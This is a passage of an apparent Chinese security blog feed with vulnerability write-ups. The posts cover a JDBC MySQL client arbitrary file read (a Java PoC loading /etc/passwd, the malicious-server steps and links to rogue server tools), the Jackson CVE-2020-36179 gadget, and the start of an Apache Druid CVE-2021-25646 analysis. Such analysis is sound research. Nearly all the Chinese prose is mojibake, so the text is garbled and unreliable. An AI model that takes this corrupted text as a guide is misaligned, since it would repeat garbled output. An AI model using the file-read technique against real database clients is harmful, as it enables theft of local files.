class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysql]</span></span><br><span class="line"><span class="attr">local-infile</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…åœ¨msyqlå‘½ä»¤è¡Œï¼Œæ˜¾å¼åŠ ä¸Š â€“local-infile</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql --local-infile 1 -hlocalhost -uroot -ppassword</span><br></pre></td></tr></table></figure><h4 id="allowLoadLocalInfile"><a href="#allowLoadLocalInfile" class="headerlink" title="allowLoadLocalInfile"></a>allowLoadLocalInfile</h4><p>åœ¨jdbc-mysql-connector sdkä¸­ï¼Œæ§åˆ¶clientæ˜¯å¦å¯ä»¥load local fileçš„å°±æ˜¯è¿™ä¸ªå‚æ•°ï¼Œåœ¨5.xå’Œ8.xä¸­é»˜è®¤éƒ½æ˜¯falseï¼ˆå‚è€ƒã€7ã€‘å’Œã€8ã€‘ï¼‰ï¼Œæ‰€ä»¥éœ€è¦åœ¨jdbc urlä¸­é…ç½®allowLoadLocalInfile=true</p><p>åœ¨8.0.22ä¸­è¿˜å¼•å…¥äº†allowLoadLocalInfileInPathï¼Œä¸è¿‡æ²¡ä»€ä¹ˆå½±å“</p><p><img src="/images/pasted-121.png" alt="upload successful"></p><h3 id="max-allowed-packet"><a href="#max-allowed-packet" class="headerlink" title="max_allowed_packet"></a>max_allowed_packet</h3><blockquote><p>å‚è€ƒã€1ã€‘ä¸­æåˆ° jdbc-mysql-connector 5.xç‰ˆæœ¬ä¸­ï¼Œé‡åˆ°max_allowed_packet çš„é—®é¢˜ï¼Œæœ€ç»ˆæ’æŸ¥å‘ç°æ˜¯client sdkä¸­çš„maxAllowedPacketå‚æ•°ï¼Œéœ€è¦serverç«¯ä¸‹å‘é…ç½®ã€‚<br>ä½œè€…é‡‡å–çš„actionæ˜¯å›å¤äº†client çš„show varialbesè¯·æ±‚ï¼Œå¹¶åœ¨å…¶ä¸­è®¾ç½®ç›¸å…³maxAllowedPacketç­‰å‚æ•°ã€‚</p></blockquote><p>å…¶å®åœ¨5.xä¸­ï¼ŒmaxAllowPacket default -1<br><img src="/images/pasted-122.png" alt="upload successful"><br>åœ¨8.*ä¸­ï¼ŒmaxAllowPacket default 65535<br><img src="/images/pasted-123.png" alt="upload successful"></p><p>æ‰€ä»¥è¿™ä¹Ÿæ˜¯jdbc-mysql-connector 5.*ç‰ˆæœ¬ä¸­éœ€è¦æ³¨æ„çš„ä¸€ä¸ªé—®é¢˜ï¼Œéœ€è¦æ˜¾å¼çš„åœ¨urlä¸­åŠ å…¥å‚æ•°maxAllowedPacket=65535.</p><h3 id="pocæ„é€ æµç¨‹"><a href="#pocæ„é€ æµç¨‹" class="headerlink" title="pocæ„é€ æµç¨‹"></a>pocæ„é€ æµç¨‹</h3><p>å‰æ–‡ load local dataæµç¨‹ä¸­ï¼Œé‡ç‚¹æ˜¯ç¬¬äºŒä¸ªï¼Œä¹Ÿå°±æ˜¯serverçš„å›åŒ…ï¼Œéœ€è¦æŒ‡å®šclientå»è¯»å–ç‰¹å®šæ–‡ä»¶ï¼Œåœ¨ä¸æ˜¯å¾ˆäº†è§£mysqlåè®®æƒ…å†µä¸‹ï¼Œæ”¹æ”¹åŒ…æœ€ç®€å•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 8.*</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">String url = <span class="string">&quot;jdbc:mysql://localhost:3306/test?useSSL=false&amp;allowLoadLocalInfile=true&amp;maxAllowedPacket=65535&quot;</span>;</span><br><span class="line">Connection conn = DriverManager.getConnection(url,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;password&quot;</span>);</span><br><span class="line">Statement stmt = conn.createStatement();</span><br><span class="line">String sql = <span class="string">&quot;load data local infile \&quot;/etc/passwd\&quot; into table test FIELDS TERMINATED BY &#x27;\\n&#x27;;&quot;</span>;</span><br><span class="line">ResultSet rs = stmt.executeQuery(sql);</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-124.png" alt="upload successful"></p><p>server çš„æ•´ä¸ªæ”»å‡»æ­¥éª¤å¦‚ä¸‹:</p><ol><li>å›å¤mysql clientä¸€ä¸ªgreetingåŒ…</li><li>ç­‰å¾…clientç«¯å‘é€ä¸€ä¸ªæŸ¥è¯¢åŒ…</li><li>å›å¤ä¸€ä¸ªfile transferåŒ…</li></ol><p>è¿™é‡Œç›´æ¥ç»™é€šç”¨çš„åˆ©ç”¨å·¥å…·</p><ol><li><p><a href="https://github.com/Gifts/Rogue-MySql-Server">https://github.com/Gifts/Rogue-MySql-Server</a></p><p> æœ€æ—©çš„åˆ©ç”¨å·¥å…·ï¼Œä¸‰ä¸ªæ­¥éª¤ï¼Œé€šè¿‡mysqlç»„åŒ…å®ç°ã€‚ä½†æ˜¯æ²¡å¤ç°æˆåŠŸâ€¦ä¼°è®¡æ˜¯mysqlåè®®é‚£é‡Œç»„åŒ…æœ‰é—®é¢˜ï¼Œå·æ‡’ä¸è¯¦ç»†åˆ†æäº†</p></li><li><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p> fnmsdçš„ï¼Œè¦å¤šçœ‹ä»–å†™çš„æ–‡æ¡£ï¼Œé€šè¿‡usernameæŒ‡å®šè¯»å–çš„æ–‡ä»¶</p></li><li><p><a href="https://github.com/yang8e/jdbc_mysql_redfile">https://github.com/yang8e/jdbc_mysql_redfile</a></p><p> yang8eçš„ï¼Œç›´æ¥å‘åŒ…ï¼Œæ²¡å…³æ³¨mysqlåè®®ç»†èŠ‚ï¼Œç²—æš´ä½†æ˜¯ä¹Ÿç®€å•ã€‚å½“æ—¶ä¹Ÿè¸©äº†ä»–è¿™ä¸ªå‘ï¼Œä¸è¿‡æœ‰æ›´é€šç”¨çš„jdbc poc urlã€‚</p></li></ol><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬ä»¥ä¸ºä¸€ç¯‡æ–‡ç« å¯ä»¥æå®šï¼Œç»“æœè¡Œæ–‡è¿˜æ˜¯è¿‡é•¿ï¼Œååºåˆ—åŒ–çš„ä¸‹ç¯‡å†åšç ”ç©¶å§ã€‚</p><p>ç®€å•æ€»ç»“ä¸‹ï¼Œæœ¬æ–‡ç ”ç©¶äº†jdbc-mysql-connectorçš„mysql clientä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œç»“è®ºæ˜¯æ— è®ºæ˜¯5.*ã€8.*éƒ½å—å½±å“ã€‚æœŸé—´è¸©äº†jdbc 5.*ç‰ˆæœ¬maxAllowedPacketçš„å‘ï¼Œå‘ç°äº†yang8eçš„è§£å†³æ–¹æ¡ˆï¼Œå¹¶æå‡ºæ›´é€šç”¨çš„pocã€‚</p><p>æŠ›å‡ºä¸ªé—®é¢˜:</p><ol><li>å¦‚ä½•ç¦ç”¨jdbc clientçš„load local fileåŠŸèƒ½ï¼Ÿé˜‰å‰²sdkï¼Ÿè¿˜æ˜¯allowLoadLocalInfile=false</li><li>ç›®å‰çš„pocåªèƒ½è¯»å–ä¸€ä¸ªæ–‡ä»¶clientå°±ä¼šæŠ›å¼‚å¸¸ï¼Œæœ‰åŠæ³•å¯ä»¥æŒç»­è¯»å–å¤šä¸ªæ–‡ä»¶å—ï¼Ÿ</li></ol><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://www.freebuf.com/articles/web/251626.html">JDBC MySQLä»»æ„æ–‡ä»¶è¯»å–ä¸­çš„ä¸€äº›å‘ï¼ˆyangxiaocheng ï¼‰</a></li><li>[2] <a href="https://www.anquanke.com/post/id/203086">MySQL JDBC å®¢æˆ·ç«¯ååºåˆ—åŒ–æ¼æ´åˆ†æï¼ˆfnmsd@360ï¼‰</a></li><li>[3] <a href="https://paper.seebug.org/1227/">MySQL JDBC å®¢æˆ·ç«¯ååºåˆ—åŒ–æ¼æ´ï¼ˆå››å“¥ï¼‰</a></li><li>[4] <a href="https://xz.aliyun.com/t/9250">MySQL JDBC ååºåˆ—åŒ–åˆ†æï¼ˆ7tem7ï¼‰</a></li><li>[5] <a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">ã€ŠNew Exploit Technique In Java Deserialization Attackã€‹(zhangyang &amp; keyiå¤§ä½¬)</a></li><li>[6] <a href="https://paper.seebug.org/1112/">CSS-T | Mysql Client ä»»æ„æ–‡ä»¶è¯»å–æ”»å‡»é“¾æ‹“å±•</a></li><li>[7] <a href="https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-connp-props-security.html">https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-connp-props-security.html</a></li><li>[8] <a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-connp-props-security.html">https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-connp-props-security.html</a></li><li>[9] <a href="http://scz.617.cn:8/network/202001101612.txt">æ¶æ„MySQL Serverè¯»å–MySQL Clientç«¯æ–‡ä»¶ï¼ˆå››å“¥ï¼‰</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¹‹å‰Getäº†h2 initsqlçš„éªšå§¿åŠ¿ï¼Œäºæ˜¯æƒ³æ€»ç»“æ€»ç»“jdbc urlå¯æ§æƒ…å†µä¸‹çš„åˆ©ç”¨æ–¹æ³•ï¼Œç»å…¸çš„åœºæ™¯å°±æ˜¯jdbc mysql æ–‡ä»¶è¯»å–å’Œååºåˆ—åŒ–ï¼Œæ­£å¥½å‰ä¸ä¹…çš„Druid CVE-2021-26919çš„ç”¨çš„å°±æ˜¯jdbc mysqlååºåˆ—åŒ–æ¼æ´ï¼Œå­¦ä¹ å­¦ä¹ ï¼Œå±…ç„¶è¸©ä¸€äº›å‘ï¼Œå•ç‹¬è®°å½•ä¸‹æ¥ã€‚&lt;/p&gt;
&lt;p&gt;mysql clientä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å†å²æ‚ ä¹…ï¼Œå‚è€ƒã€6ã€‘ä¸­æœ‰æåˆ°æ—©åœ¨13å¹´å°±æœ‰æå‡ºï¼Œä½†æ˜¯ä½œä¸ºmysql æ­£å¸¸åŠŸèƒ½ä¸€ç›´ä¿ç•™ã€‚ç›´åˆ°19å¹´blackhat å¼ æ¨å’Œå¯å¥• å¤§ä½¬å‘ç°ååºåˆ—åŒ–çš„åˆ©ç”¨åœºæ™¯ï¼ˆå‚è€ƒã€5ã€‘ï¼‰ï¼Œç›¸å…³ç ”ç©¶è¾¾åˆ°å°é«˜æ½®ï¼Œä¸è¿‡å¤šèµ˜è¿°ã€‚&lt;/p&gt;
&lt;h2 id=&quot;MySQL-Clientæ–‡ä»¶è¯»å–æ¼æ´&quot;&gt;&lt;a href=&quot;#MySQL-Clientæ–‡ä»¶è¯»å–æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;MySQL Clientæ–‡ä»¶è¯»å–æ¼æ´&quot;&gt;&lt;/a&gt;MySQL Clientæ–‡ä»¶è¯»å–æ¼æ´&lt;/h2&gt;&lt;h3 id=&quot;åŸç†ï¼šload-local-data&quot;&gt;&lt;a href=&quot;#åŸç†ï¼šload-local-data&quot; class=&quot;headerlink&quot; title=&quot;åŸç†ï¼šload local data&quot;&gt;&lt;/a&gt;åŸç†ï¼šload local data&lt;/h3&gt;&lt;p&gt;æ­£å¸¸çš„load local dataæµç¨‹&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;clientï¼šç”³è¯·è·‘ä¸ªsqlï¼Œå†…å®¹æ˜¯&amp;quot;load data local infile &amp;quot;&amp;#x2F;etc&amp;#x2F;passwd&amp;quot; into table test FIELDS TERMINATED BY &amp;#39;\n&amp;#39;;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;serverï¼šå¥½çš„ï¼Œï¼ˆè¯†åˆ«sqlå†…å®¹ï¼‰ï¼Œé‚£ä½ æŠŠ&amp;#x2F;etc&amp;#x2F;passwdæ–‡ä»¶è¯»å–ä¼ è¿‡æ¥å§&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;clientï¼šå¥½çš„ï¼Œï¼ˆè¯»å–æœ¬åœ°&amp;#x2F;etc&amp;#x2F;passwdï¼‰ï¼Œè¿™æ˜¯æ–‡ä»¶å†…å®¹ï¼Œè¯·æŸ¥æ”¶&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;æ”»å‡»æµç¨‹&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;clientï¼šç”³è¯·è·‘ä¸ªsqlï¼Œå†…å®¹æ˜¯&amp;quot;***&amp;quot;ï¼ˆjdbc-mysql-connectoré»˜è®¤è®¤è¯ç™»å½•å®Œæˆä¹‹åï¼Œä¼šæœ‰show variables&amp;#x2F;select å‚æ•°ç­‰è¡Œä¸ºï¼‰&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;serverï¼šå¥½çš„ï¼Œï¼ˆä¸ç®¡sqlå†…å®¹ï¼‰ï¼Œé‚£ä½ æŠŠ&amp;#x2F;etc&amp;#x2F;passwdæ–‡ä»¶è¯»å–ä¼ è¿‡æ¥å§&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;clientï¼šå¥½çš„ï¼Œï¼ˆè¯»å–æœ¬åœ°&amp;#x2F;etc&amp;#x2F;passwdï¼‰ï¼Œè¿™æ˜¯æ–‡ä»¶å†…å®¹ï¼Œè¯·æŸ¥æ”¶&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="MySQL" scheme="http://m0d9.me/tags/MySQL/"/>
    
    <category term="Jdbc" scheme="http://m0d9.me/tags/Jdbc/"/>
    
  </entry>
  
  <entry>
    <title>JackSon DriverAdapterCPDS gadget CVE-2020-36179åˆ†æ</title>
    <link href="http://m0d9.me/2021/04/09/JackSon-CVE-2020-36179%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2021/04/09/JackSon-CVE-2020-36179%E5%88%86%E6%9E%90/</id>
    <published>2021-04-09T04:30:00.000Z</published>
    <updated>2021-04-19T07:25:35.513Z</updated>
    
    <content type="html"><![CDATA[<p>Day1å‘ç°æœ‰åˆ†æ jackson çš„DriverAdapterCPDS è¿™ä¸ªgadget</p><h2 id="èƒŒæ™¯çŸ¥è¯†"><a href="#èƒŒæ™¯çŸ¥è¯†" class="headerlink" title="èƒŒæ™¯çŸ¥è¯†"></a>èƒŒæ™¯çŸ¥è¯†</h2><p>å…¶å®æ˜¯å‚è€ƒã€1ã€‘å¤§ä½¬ä¸ŠæŠ¥çš„CVE-2020-36179</p><p>Gadget:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DriverAdapterCPDS</span><br><span class="line">    -&gt;seturl</span><br><span class="line">        -&gt;getPooledConnection</span><br><span class="line">            -&gt;DirverManager.getConnection(this.url,username,pass)</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>gadgetæµç¨‹å¾ˆç®€å•ï¼Œä½†æ˜¯åœ¨å¤ç°çš„æ—¶å€™å‘ç°å¡åœ¨getParentLoggerè¿™é‡Œï¼Œä¸ä¼šæ‰§è¡Œåˆ°getPooledConnection</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Logger <span class="title">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> SQLFeatureNotSupportedException();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯è§getParentLoggerç®€å•ç²—æš´ç›´æ¥throw Exceptionï¼Œç›´æ¥GG</p><p>å¤šæ¬¡æµ‹è¯•å‘ç°getParentLoggerï¼ŒgetPooledConnectionæ‰§è¡Œé¡ºåºå¹¶ä¸æ˜¯æœ‰åºçš„ï¼Œå¦‚ä¸‹ï¼š</p><p>å¤±è´¥<br><img src="/images/pasted-120.png" alt="upload successful"></p><p>æˆåŠŸ<br><img src="/images/pasted-119.png" alt="upload successful"></p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>èƒŒæ™¯çŸ¥è¯†ï¼šjacksonååºåˆ—åŒ–ä¼šæ‰§è¡Œéƒ¨åˆ†getter</p><p>getterçš„äº§ç”Ÿæµç¨‹è·Ÿè¸ªï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">_addMemberMethods:110, AnnotatedMethodCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">collect:42, AnnotatedMethodCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">collectMethods:33, AnnotatedMethodCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">_methods:365, AnnotatedClass (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">memberMethods:305, AnnotatedClass (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">_addMethods:525, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">collectAll:309, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">getPropertyMap:287, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">getProperties:170, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">_properties:164, BasicBeanDescription (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">findProperties:239, BasicBeanDescription (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">_findCreatorsFromProperties:361, BasicDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_constructDefaultValueInstantiator:345, BasicDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">findValueInstantiator:269, BasicDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">buildBeanDeserializer:214, BeanDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">createBeanDeserializer:137, BeanDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_createDeserializer2:411, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_createDeserializer:349, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_createAndCache2:264, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_createAndCacheValueDeserializer:244, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">findValueDeserializer:142, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">findContextualValueDeserializer:444, DeserializationContext (com.fasterxml.jackson.databind)</span><br><span class="line">_findDeserializer:194, TypeDeserializerBase (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">_deserialize:97, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromAny:71, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:712, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserialize:68, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">_readMapAndClose:4014, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:3005, ObjectMapper (com.fasterxml.jackson.databind)</span><br></pre></td></tr></table></figure><blockquote><p>æœ€ç»ˆè§‚å¯Ÿå‘ç°jacksoné€šè¿‡ ClassUtil.getClassMethods(cls)è·å–æ‰€æœ‰çš„å‡½æ•°ï¼Œæœ€ç»ˆè°ƒç”¨çš„æ˜¯getDeclaredMethods()ï¼Œè€ŒgetDeclaredMethods()è¿”å›æ•°ç»„ä¸­çš„å…ƒç´ æ²¡æœ‰æ’åºï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•ç‰¹å®šçš„é¡ºåºï¼Œä»è€Œå¯¼è‡´éšæœºè§¦å‘ã€‚</p></blockquote><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>ç®€å•è·Ÿè¸ªåˆ†æäº†CVE-2020-36179 è¿™ä¸ªé“¾ï¼Œå‘ç°2å¤„æœ‰æ„æ€çš„ç‚¹</p><ol><li>jdbc url å¯æ§æƒ…å†µä¸‹ï¼Œåˆ©ç”¨H2 sqlå¯æ”»å‡»h2 serverï¼ˆï¼‰</li><li>getDeclaredMethods éšæœºç‰¹æ€§</li></ol><p>æ‹“å±•æ€è€ƒ</p><ol><li>jdbc urlå¯æ§æ˜¯ä¸ªé€šç”¨é—®é¢˜</li><li>getDeclaredMethods éšæœºç‰¹æ€§æœ‰ç»•è¿‡æ–¹æ³•å—ï¼Ÿ</li></ol><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://github.com/Al1ex/CVE-2020-36179">Al1ex/CVE-2020-36179</a></li><li>[2] <a href="http://www.h2database.com/html/features.html#execute_sql_on_connection">H2 feature</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Day1å‘ç°æœ‰åˆ†æ jackson çš„DriverAdapterCPDS è¿™ä¸ªgadget&lt;/p&gt;
&lt;h2 id=&quot;èƒŒæ™¯çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯çŸ¥è¯†&quot;&gt;&lt;/a&gt;èƒŒæ™¯çŸ¥è¯†&lt;/h2&gt;&lt;p&gt;å…¶å®æ˜¯å‚è€ƒã€1ã€‘å¤§ä½¬ä¸ŠæŠ¥çš„CVE-2020-36179&lt;/p&gt;
&lt;p&gt;Gadget:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;DriverAdapterCPDS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -&amp;gt;seturl&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        -&amp;gt;getPooledConnection&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            -&amp;gt;DirverManager.getConnection(this.url,username,pass)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´åˆ†æ" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Gadget" scheme="http://m0d9.me/tags/Gadget/"/>
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="Jackson" scheme="http://m0d9.me/tags/Jackson/"/>
    
  </entry>
  
  <entry>
    <title>Apache Druid CVE-2021-25646 æ¼æ´åˆ†æ</title>
    <link href="http://m0d9.me/2021/02/19/Apache-Druid-CVE-2021-25646-%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2021/02/19/Apache-Druid-CVE-2021-25646-%E5%88%86%E6%9E%90/</id>
    <published>2021-02-19T03:16:00.000Z</published>
    <updated>2021-04-24T05:56:58.714Z</updated>
    
    <content type="html"><![CDATA[<p>Litch1å¤§ä½¬çš„è¿™ä¸ªæ´æœ‰æ„æ€ï¼Œç»ˆäºæœ‰æ—¶é—´åˆ†æä¸‹ï¼Œè®°å½•ä¸‹åˆ†æè¿‡ç¨‹</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><a href="https://archive.apache.org/dist/druid/">https://archive.apache.org/dist/druid/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$wget</span> https://archive.apache.org/dist/druid/0.20.0/apache-druid-0.20.0-bin.tar.gz &amp;&amp; tar -xzvf apache-druid-0.20.0-bin.tar.gz</span><br></pre></td></tr></table></figure><p>æ ¹æ®å‚è€ƒï¼Œä¿®æ”¹conf/druid/single-server/micro-quickstart/coordinator-overlord/jvm.configï¼Œæœ«å°¾å¢åŠ è°ƒè¯•å‚æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Xdebug -Xnoagent -Djava.compiler&#x3D;NONE -Xrunjdwp:transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="èƒŒæ™¯çŸ¥è¯†"><a href="#èƒŒæ™¯çŸ¥è¯†" class="headerlink" title="èƒŒæ™¯çŸ¥è¯†"></a>èƒŒæ™¯çŸ¥è¯†</h2><h3 id="Jacksonæ³¨è§£"><a href="#Jacksonæ³¨è§£" class="headerlink" title="Jacksonæ³¨è§£"></a>Jacksonæ³¨è§£</h3><h4 id="nameä¸ºç©ºå­—ç¬¦ä¸²çš„CreatorProperty"><a href="#nameä¸ºç©ºå­—ç¬¦ä¸²çš„CreatorProperty" class="headerlink" title="nameä¸ºç©ºå­—ç¬¦ä¸²çš„CreatorProperty"></a>nameä¸ºç©ºå­—ç¬¦ä¸²çš„CreatorProperty</h4><p>ä½œè€…ç»™å‡ºè¿™ä¸ªæ¼æ´çš„å…³é”®ç‚¹è§£é‡Š</p><blockquote><p>æ¼æ´çš„å…³é”®ï¼š<br>åœ¨äºå¯¹ç”¨JsonCreatoræ³¨è§£ä¿®é¥°çš„æ–¹æ³•æ¥è¯´ï¼Œæ–¹æ³•çš„æ‰€æœ‰å‚æ•°éƒ½ä¼šè§£ææˆCreatorPropertyç±»å‹ï¼Œå¯¹äºæ²¡æœ‰ä½¿ç”¨JsonPropertyæ³¨è§£ä¿®é¥°çš„å‚æ•°æ¥è¯´,ä¼šåˆ›å»ºä¸€ä¸ªnameä¸ºâ€â€çš„CreatorPropertyï¼Œåœ¨ç”¨æˆ·ä¼ 